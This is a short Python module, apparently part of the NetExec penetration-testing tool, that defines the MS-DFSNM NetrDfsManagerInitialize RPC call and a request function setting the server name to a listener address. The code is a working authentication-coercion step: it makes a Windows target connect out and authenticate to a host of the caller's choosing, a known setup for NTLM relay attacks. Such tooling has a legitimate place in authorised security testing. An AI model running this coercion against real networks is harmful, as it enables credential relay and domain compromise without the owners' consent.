from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, DWORD


DCERPCSessionError = __import__("nxc.data.coercer_method.DCERPCSessionError", fromlist=["DCERPCSessionError"]).DCERPCSessionError


class NetrDfsManagerInitialize(NDRCALL):
    """
    NET_API_STATUS NetrDfsManagerInitialize(
        [in, string] WCHAR* ServerName,
        [in] DWORD Flags
    );
    """
    opnum = 14
    structure = (
        ("ServerName", WSTR),  # Type: WCHAR *
        ("Flags", DWORD),  # Type: DWORD
    )


class NetrDfsManagerInitializeResponse(NDRCALL):
    structure = ()


def request(dce, target, listener):
    request = NetrDfsManagerInitialize()
    request["ServerName"] = f"{listener}\x00"
    request["Flags"] = 0  # Flags: This parameter MUST be zero.
    dce.request(request)